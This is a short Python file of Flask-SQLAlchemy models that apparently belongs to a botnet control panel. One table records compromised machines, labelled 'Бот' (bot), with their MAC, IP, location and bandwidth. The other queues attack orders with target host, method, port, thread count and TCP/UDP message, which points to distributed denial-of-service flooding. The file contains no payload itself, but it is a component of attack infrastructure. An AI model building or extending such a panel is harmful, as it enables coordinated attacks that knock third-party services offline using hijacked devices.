from app import db, app


class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    mac = db.Column(db.String(48), unique=True)
    ip = db.Column(db.String(48), unique=True)
    address = db.Column(db.Text())
    internet_speed = db.Column(db.Text())
    last_seen = db.Column(db.Text())

    def __repr__(self):
        return f'Бот: {self.mac[:12]}'


class Attack(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    host = db.Column(db.Text())
    method = db.Column(db.Text())
    smart = db.Column(db.Boolean(), default=False)
    timeout = db.Column(db.Text())
    msg_tcp_udp = db.Column(db.Text())
    port = db.Column(db.Text())
    max_thread = db.Column(db.Text())
    percent = db.Column(db.Text())


with app.app_context():
    db.create_all()
